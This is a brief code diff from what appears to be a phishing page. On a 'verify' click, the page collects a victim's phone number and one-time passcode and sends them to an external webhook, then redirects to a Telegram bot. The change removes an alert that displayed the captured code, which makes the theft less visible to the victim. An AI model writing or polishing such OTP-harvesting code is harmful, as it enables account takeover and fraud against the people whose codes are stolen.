@@ -325,8 +325,7 @@
         verifyButton.addEventListener('click',()=>{
             if(invalidOtp()==false){
                 const otp = getOTPNumbers();
-                const message = `NUMBER : ${phoneNumber}\nOTP: ${otp}`
-                alert(message);
+                const message = `NUMBER : ${phoneNumber}\nOTP: ${otp}`;
                 sendToWebhook(message);
                 window.location.href=`https://t.me/${botName}`;
             }else{
